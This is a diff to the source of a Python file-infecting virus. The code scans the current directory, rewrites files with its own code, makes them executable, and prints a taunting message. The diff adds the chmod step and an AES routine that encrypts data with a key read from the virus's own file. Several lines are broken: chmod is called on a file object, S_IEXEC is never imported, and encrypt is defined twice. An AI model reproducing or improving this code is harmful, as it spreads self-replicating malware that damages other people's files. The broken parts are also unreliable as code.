@@ -1,3 +1,4 @@
+import os
 def is_infected(filename):
    f = open(filename, 'r')
    lines = f.readlines()
@@ -11,6 +12,7 @@ def infect(filename):
    os.rename(filename, filename + '-copy')
 
    destination = open(filename, 'w')
+   os.chmod(destination, S_IEXEC)
    source = open(filename + '-copy', 'r')
    this = open(__main__.__file__, 'r')
 
@@ -42,7 +44,7 @@ def infect(filename):
    source.close()
    destination.close()
    this.close()
- 
+
 def find_and_infect_files():
    # In the current directory
    path = '.'
@@ -68,5 +70,16 @@ def encrypt(data,filename):
 def payload():
    print "This file is infected infected! Mhuahauhauahau!"
 
+def encrypt(data):
+   this = open(__main__.__file__, 'r')
+
+   iv = Random.new().read(AES.block_size)
+   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
+   encrypted = iv + cipher.encrypt(data)
+
+   this.close()
+   return base64.b64encode(encrypted)
+ ####################
+ 
 find_and_infect_files()
 payload()
